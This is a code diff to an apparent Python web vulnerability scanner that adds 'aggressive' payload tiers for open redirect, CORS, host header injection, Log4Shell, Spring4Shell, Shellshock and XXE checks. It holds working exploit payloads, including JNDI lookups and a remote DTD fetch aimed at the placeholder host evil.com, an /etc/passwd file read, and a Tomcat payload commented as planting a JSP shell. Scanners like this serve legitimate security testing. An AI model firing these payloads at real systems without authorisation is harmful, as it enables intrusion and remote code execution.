@@ -371,47 +371,136 @@ def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dic
     return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": not issues, "details": issues}
 
 def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Open Redirect: Header and Meta-refresh."""
+    """Open Redirect: Header and Meta-refresh bypasses."""
+    # FREE TIER: Simple domain redirects
     payloads = ["http://evil.com", "//evil.com", "https://google.com"]
-    fields = scenario.config.get("fields", ["next", "url", "redirect", "u"])
+    
+    # AGGRESSIVE TIER: Obfuscated and bypass schemes
+    if scenario.config.get("aggressive"):
+        payloads.extend([
+            "/%09/evil.com",
+            "/%5c/evil.com",
+            "//evil.com/%2f%2e%2e",
+            "http:evil.com",
+            "//google.com%2fevil.com"
+        ])
+
+    fields = scenario.config.get("fields", ["next", "url", "redirect", "u", "returnTo", "target"])
     issues = []
 
     for field in fields:
         for p in payloads:
             resp = client.send("GET", scenario.target, params={field: p})
-            if "evil.com" in resp.url or "google.com" in resp.url:
-                issues.append(f"Open Redirect in '{field}' -> {resp.url}")
+            if "evil.com" in resp.url or "google.com" in resp.url or "evil.com" in resp.headers.get("Location", ""):
+                issues.append(f"Open Redirect in '{field}' -> {p}")
                 break
 
     return {"scenario_id": scenario.id, "attack_type": "open_redirect", "passed": not issues, "details": issues}
 
+def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """CORS Misconfiguration: Wildcard and Reflection checks."""
+    issues = []
+    
+    # FREE TIER: Simple wildcard check
+    resp = client.send("OPTIONS", scenario.target, headers={"Origin": "https://evil.com"})
+    acao = resp.headers.get("Access-Control-Allow-Origin", "")
+    if acao == "*" or acao == "https://evil.com":
+        issues.append(f"CORS Misconfiguration: {acao} reflected in Access-Control-Allow-Origin")
+        
+    # AGGRESSIVE TIER: Credential and Null origin checks
+    if scenario.config.get("aggressive"):
+        resp_null = client.send("OPTIONS", scenario.target, headers={"Origin": "null"})
+        if resp_null.headers.get("Access-Control-Allow-Origin") == "null":
+            issues.append("CORS Misconfiguration: Null Origin allowed")
+            
+        allow_creds = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
+        if allow_creds == "true" and acao == "*":
+             issues.append("CORS Risk: Wildcard origin with credentials allowed")
+
+    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}
+
+def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """Host Header Injection: Cache poisoning and reset link bypasses."""
+    evil_host = "evil.com"
+    issues = []
+    
+    # FREE TIER: Basic Host header override
+    resp = client.send("GET", scenario.target, headers={"Host": evil_host})
+    if evil_host in resp.headers.get("Location", "") or evil_host in resp.text:
+        issues.append("Host Header Injection: 'evil.com' reflected in response.")
+        
+    # AGGRESSIVE TIER: X-Forwarded-Host and Host-Port bypasses
+    if scenario.config.get("aggressive"):
+        resp_xfh = client.send("GET", scenario.target, headers={"X-Forwarded-Host": evil_host})
+        if evil_host in resp_xfh.text:
+            issues.append("X-Forwarded-Host Injection: 'evil.com' reflected.")
+            
+        resp_port = client.send("GET", scenario.target, headers={"Host": f"localhost:80@{evil_host}"})
+        if evil_host in resp_port.text:
+            issues.append("Host Header obfuscation success.")
+
+    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}
+
 def run_cve_log4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Log4Shell: JNDI Injection."""
+    """Log4Shell (CVE-2021-44228): JNDI Injection in headers/params."""
+    # FREE TIER: Standard User-Agent injection
     payload = "${jndi:ldap://evil.com/a}"
-    # Aggressive adds more headers
-    headers = {"User-Agent": payload, "X-Api-Version": payload, "Referer": payload}
+    headers = {"User-Agent": payload}
+    
+    # AGGRESSIVE TIER: Exhaustive header and path coverage
+    if scenario.config.get("aggressive"):
+        headers.update({
+            "X-Api-Version": payload,
+            "Referer": payload,
+            "X-Forwarded-For": payload,
+            "Authentication": f"Bearer {payload}"
+        })
+        client.send("GET", f"{scenario.target}?debug={payload}")
+
     client.send("GET", scenario.target, headers=headers)
-    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": True, "details": "Log4Shell Payload Sent."}
+    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": True, "details": "Log4Shell payloads delivered to priority headers."}
 
 def run_cve_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Spring4Shell: ClassLoader Manipulation."""
+    """Spring4Shell (CVE-2022-22965): ClassLoader resource manipulation."""
+    # PAYLOAD: Modifies Tomcat logging to create a JSP shell
     payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
+    
+    # AGGRESSIVE: Tries different variations for varying Tomcat/Spring setups
+    if scenario.config.get("aggressive"):
+        # Variation for different resource paths
+        client.send("POST", scenario.target, form_body="class.module.classLoader.URLs[0]=http://evil.com")
+
     resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
-    issues = ["Potential Spring4Shell"] if "classLoader" in resp.text else []
+    issues = ["Potential Spring4Shell: Server responded to classLoader modification"] if "classLoader" in resp.text else []
+    
     return {"scenario_id": scenario.id, "attack_type": "cve_spring4shell", "passed": not issues, "details": issues}
 
 def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Shellshock: CGI Header Injection."""
+    """Shellshock (CVE-2014-6271): Bash environment variable injection."""
+    # FREE TIER: Standard echo check
     payload = "() { :; }; echo; /bin/bash -c 'id'"
-    resp = client.send("GET", scenario.target, headers={"User-Agent": payload})
-    issues = ["Shellshock RCE"] if "uid=" in resp.text else []
+    
+    # AGGRESSIVE TIER: Variant payloads for bypass
+    if scenario.config.get("aggressive"):
+        payload = "() { _; } >_[$($())] { id; }"
+
+    resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
+    issues = ["Shellshock RCE CONFIRMED: 'id' output detected"] if "uid=" in resp.text else []
+    
     return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues}
 
 def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """XML External Entity: File Exfiltration."""
+    """XML External Entity: Local file exfiltration via DOCTYPE."""
+    # FREE TIER: Simple system entity
     payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    
+    # AGGRESSIVE TIER: Parameter entities and PHP filters
+    if scenario.config.get("aggressive"):
+        payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/x.dtd">%remote;]><a>&exfil;</a>'
+
     resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
-    issues = ["XXE Confirmed"] if "root:x:0:0" in resp.text else []
+    issues = ["XXE Vulnerability: /etc/passwd contents reflected"] if "root:x:0:0" in resp.text else []
+    
     return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "details": issues}
 
 def run_malformed_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
